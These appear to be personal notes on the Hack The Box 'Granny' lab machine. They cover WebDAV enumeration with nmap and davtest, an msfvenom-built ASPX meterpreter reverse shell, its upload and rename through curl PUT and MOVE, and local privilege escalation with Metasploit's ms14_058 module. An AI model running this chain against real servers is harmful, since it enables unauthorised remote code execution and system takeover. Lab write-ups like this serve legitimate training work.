```
web is using asp.net

webdev is used

alot method is allowed according to nmap scan

Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK

 davtest -url http://granny.htb
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://granny.htb
********************************************************
NOTE	Random string for this session: bhAQoSTBrR1o
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://granny.htb/DavTestDir_bhAQoSTBrR1o
********************************************************
 Sending test files
PUT	asp	FAIL
PUT	txt	SUCCEED:	http://granny.htb/DavTestDir_bhAQoSTBrR1o/davtest_bhAQoSTBrR1o.txt
PUT	shtml	FAIL
PUT	aspx	FAIL
PUT	jhtml	SUCCEED:	http://granny.htb/DavTestDir_bhAQoSTBrR1o/davtest_bhAQoSTBrR1o.jhtml
PUT	cfm	SUCCEED:	http://granny.htb/DavTestDir_bhAQoSTBrR1o/davtest_bhAQoSTBrR1o.cfm
PUT	cgi	FAIL
PUT	jsp	SUCCEED:	http://granny.htb/DavTestDir_bhAQoSTBrR1o/davtest_bhAQoSTBrR1o.jsp
PUT	html	SUCCEED:	http://granny.htb/DavTestDir_bhAQoSTBrR1o/davtest_bhAQoSTBrR1o.html
PUT	php	SUCCEED:	http://granny.htb/DavTestDir_bhAQoSTBrR1o/davtest_bhAQoSTBrR1o.php
PUT	pl	SUCCEED:	http://granny.htb/DavTestDir_bhAQoSTBrR1o/davtest_bhAQoSTBrR1o.pl
********************************************************
 Checking for test file execution
EXEC	txt	SUCCEED:	http://granny.htb/DavTestDir_bhAQoSTBrR1o/davtest_bhAQoSTBrR1o.txt
EXEC	jhtml	FAIL
EXEC	cfm	FAIL
EXEC	jsp	FAIL
EXEC	html	SUCCEED:	http://granny.htb/DavTestDir_bhAQoSTBrR1o/davtest_bhAQoSTBrR1o.html
EXEC	php	FAIL
EXEC	pl	FAIL


msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=4567 -f aspx > granny.aspx  

#--data binary to escape spaces and code error
curl -X PUT http://10.10.10.15/granny.txt --data-binary @granny.aspx -vv 
curl -X PUT http://10.10.10.15/granny.txt -d @granny.aspx -vv 

#same like "mv granny.tx granny.aspx" in linux
curl -X MOVE -H 'Destination:http://10.10.10.15/granny.aspx' http://10.10.10.15/granny.txt -vv

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost tun0
set lport 4567
exploit

ctrl + z
search suggest
use 2
set session 1
exploit

use exploit/windows/local/ms14_058_track_popup_menu
set lhost tun0
set session 1
exploit


```
